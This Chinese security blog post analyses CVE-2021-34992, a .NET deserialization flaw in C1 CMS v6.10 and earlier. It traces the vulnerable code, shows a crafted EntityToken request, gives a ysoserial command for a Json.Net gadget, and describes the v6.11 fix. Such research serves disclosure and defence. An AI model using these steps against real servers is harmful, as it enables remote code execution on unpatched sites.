> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/TCqxtQvQdrlGynsVzNMiqQ)

**关注公众号回复 “漏洞” 获取研究环境或工具**

  

  

漏洞信息

C1 CMS 是一款基于微软. NET 框架开发的开源网站内容管理系统。近日 C1 CMS 爆出存在. NET 反序列化漏洞，影响 v6.10 及以下版本，漏洞编号为 CVE-2021-34992。

下载 v6.10 源代码，通过 Visual Studio 打开工程直接运行即可：

![](https://mmbiz.qpic.cn/mmbiz_png/wQ0FicTls5iauzV3KGS8ZwzicPmfamI8Snvz268H3Zq41IAOicu891zP7TZlSOshO9L1gibVmAAUH6Ns2XceCiakI8dA/640?wx_fmt=png)

  

  

漏洞分析

C1 CMS 采用 ASP.NET Web Form 技术进行构建。通过分析，发现在文件 `\Composite\content\views\relationshipgraph\Default.aspx.cs` 中存在反序列化操作：

![](https://mmbiz.qpic.cn/mmbiz_png/wQ0FicTls5iauzV3KGS8ZwzicPmfamI8SnvqticImoP5ttbJQ0jibE3X7U4yic7AGNHFwhhAV2M44Sa4qHDt4GudG15A/640?wx_fmt=png)

通过调用 `CompositeJsonSerializer.IsJsonSerialized` 判断传递参数格式，看下函数定义：

![](https://mmbiz.qpic.cn/mmbiz_png/wQ0FicTls5iauzV3KGS8ZwzicPmfamI8SnvMI1TwOW2orsQLnPo8iaM2C31QxQnRDOibYBKQSB5wnplQ6UTkCO1ZZ0g/640?wx_fmt=png)

接着进行如下操作：

```
entityToken = CompositeJsonSerializer.Deserialize<EntityToken>(serializedEntityToken, includeHashValue);
```

`CompositeJsonSerializer.Deserialize`：

![](https://mmbiz.qpic.cn/mmbiz_png/wQ0FicTls5iauzV3KGS8ZwzicPmfamI8SnvVtPdZtFBKLYdmCrIOcZGZr4S4urc4C8tTEG6BdcWOibVFrjcJfVt7GQ/640?wx_fmt=png)

对输入的字符串参数进行处理，提取 `type`，然后从 `type` 提取 `Deserialize` 函数，当该函数为 `null` 时，将调用 `CompositeJsonSerializer#Deserialize` 函数：

![](https://mmbiz.qpic.cn/mmbiz_png/wQ0FicTls5iauzV3KGS8ZwzicPmfamI8Snvhia9iaEVrDErkrAQ2CRtXkRMXlRibdBmPL5mx7x8pjOOE45eF673FbzQA/640?wx_fmt=png)

```
TypeNameHandling = TypeNameHandling.Auto
```

存在潜在的反序列化漏洞触发点。  

  

  

利用构造  

从上面分析可知，访问的 GET 参数 `EntityToken` 格式大致如下：

```
{"meta:obj":"***","meta:type":"***"}
```

其中提取 `meta:obj` 的值作为反序列化操作的字符串输入参数，`meta:type` 的值对应 `Type` 对象，需要找一个不存在 `Deserialize` 的 `Type` 类型，熟悉. NET 反序列化的小伙伴应该知道很多这样的类型，比如我们可以设置为 `ObjectDataProvider`，构造如下请求：

```
http://localhost:36859/Composite/content/views/relationshipgraph/Default.aspx?EntityToken={"meta:obj":"123","meta:type":"System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35"}
```

![](https://mmbiz.qpic.cn/mmbiz_png/wQ0FicTls5iauzV3KGS8ZwzicPmfamI8SnvIrQZJSnytbLblFHyYrhhmSb2U1Kib1t9y3jGQHfJibzQf4ZgN7GL3Atw/640?wx_fmt=png)

数据流成功到达反序列化触发点，回顾反序列化开始的操作点：

```
entityToken = CompositeJsonSerializer.Deserialize<EntityToken>(serializedEntityToken, includeHashValue);
```

采用. NET 泛型操作，限定类型必须是 `EntityToken`：

![](https://mmbiz.qpic.cn/mmbiz_png/wQ0FicTls5iauzV3KGS8ZwzicPmfamI8SnvdRv0uDdibZYjwRRe7u99FIibAO3RCdNSkw1ibBVUSJOSIgpjNjnEoL1BQ/640?wx_fmt=png)

`EntityToken` 是一个抽象类，也就是说现在需要找到一个继承于 `EntityToken` 的子类，并且存在 `Object` 类型的成员变量用于存放反序列化 Gadget，最终找到 2 个比较合适的子类：

![](https://mmbiz.qpic.cn/mmbiz_png/wQ0FicTls5iauzV3KGS8ZwzicPmfamI8SnvOMHVuTT6sBHxtGRhVslLPwVFMVCGaT68j9FjyibWLlG9fksoB4XaF6Q/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/wQ0FicTls5iauzV3KGS8ZwzicPmfamI8Snvz2LKhrTeUorcOE4ckiadohrJn9Mciaiay1jqXe71Lt2IIZ5SKwwUJTe3w/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/wQ0FicTls5iauzV3KGS8ZwzicPmfamI8SnvGwP6C4OGqriamcrqjtSAfSTHJ9icKA2nP5z9RrfgDC6QOjRHuVqmbwzQ/640?wx_fmt=png)

以其中的 `DataGroupingProviderHelperEntityToken` 为例，存在一个名为 `GroupingValues` 的键值对变量：

```
public Dictionary<string, object> GroupingValues { get; set; }
```

value 为 `object` 类型，可以用于存放 Gadget。首先生成一个 Json.Net 的 Gadget，这里使用 `SessionSecurityToken` 来实现：

```
ysoserial.exe -g SessionSecurityToken  -f Json.Net -c calc
```

![](https://mmbiz.qpic.cn/mmbiz_png/wQ0FicTls5iauzV3KGS8ZwzicPmfamI8SnvcSK8AuCicFia6GxKJheny3XSXOV5eWQtUyxdSGZKLSgribR7bkJ2MU5lg/640?wx_fmt=png)

构造生成 Payload 的代码如下：

![](https://mmbiz.qpic.cn/mmbiz_png/wQ0FicTls5iauzV3KGS8ZwzicPmfamI8SnvuHeF36flIg8nyPtldCnxKb9WFTmCIM8Gf1K2hDh7eDhA21uIld2fPQ/640?wx_fmt=png)

替换加入 Gadget 对象后，构造的最终请求如下（注意做好 URL 编码）：

![](https://mmbiz.qpic.cn/mmbiz_png/wQ0FicTls5iauzV3KGS8ZwzicPmfamI8SnvEpyicHQjHy9rKIjw9AwwFVS7b2T10jFlcBUickzvxW9RLf8PM2m5zDwg/640?wx_fmt=png)

  

  

修复方式  

C1 CMS 重写了 Newtonsoft.Json 的 `DefaultSerializationBinder` 类，名为 `CompositeSerializationBinder`，在新版本 v6.11 中新增了一个名为 `ValidateTypeIsSupported` 的函数，用于在反序列化时验证 `Type` 类型：

![](https://mmbiz.qpic.cn/mmbiz_png/wQ0FicTls5iauzV3KGS8ZwzicPmfamI8Snv4belgdjWQQauGCVCD4umGL9yzYgXBsp9Zk9pk59iaGqyLibH0eySjb8g/640?wx_fmt=png)

**由于传播、利用此文档提供的信息而造成任何直接或间接的后果及损害，均由使用本人负责，且听安全团队及文章作者不为此承担任何责任。**

点关注，不迷路！

![](https://mmbiz.qpic.cn/mmbiz_jpg/wQ0FicTls5iauNXqMkJeBQdmUF1W8WSY0rhpuLRQkEuPE3xbpfaevBHSqiaBT6wMbicRVOWic7Kphgf8wHRG8CG9jkg/640?wx_fmt=jpeg)

**关注公众号回复 “漏洞” 获取研究环境或工具**